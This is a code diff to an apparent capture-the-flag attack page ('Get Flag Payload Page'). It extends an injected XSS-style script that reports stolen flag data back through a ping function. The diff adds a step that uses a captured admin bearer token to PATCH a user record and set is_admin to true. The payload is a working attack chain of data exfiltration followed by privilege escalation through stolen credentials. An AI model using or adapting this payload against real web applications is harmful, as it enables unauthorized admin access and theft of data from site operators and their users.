@@ -99,7 +99,21 @@
                     stage: "FLAG2_RETRIEVED_SUCCESS", 
                     flag_payload: JSON.stringify(flagData) // Gửi toàn bộ JSON chứa flag
                 });
-            })
+
+// ✅ Bước 3: Cấp quyền cho user id 201 (bên trong chuỗi .then)
+    return fetch("/api/admin/users/201", {
+        method: "PATCH",
+        headers: {
+            "Accept": "application/json",
+            "Content-Type": "application/json",
+            "Authorization": "Bearer " + adminApiToken,
+            "X-Requested-With": "XMLHttpRequest"
+        },
+        body: JSON.stringify({
+            is_admin: true
+        })
+    });        
+        })
             .catch(error => {
                 sendPing({ 
                     stage: "overall_CATCH_ERROR", 
@@ -109,6 +123,8 @@
             });
         })();
     </script>'>
+
+
 </head>
 <body>
     <h1>Get Flag Payload Page</h1>
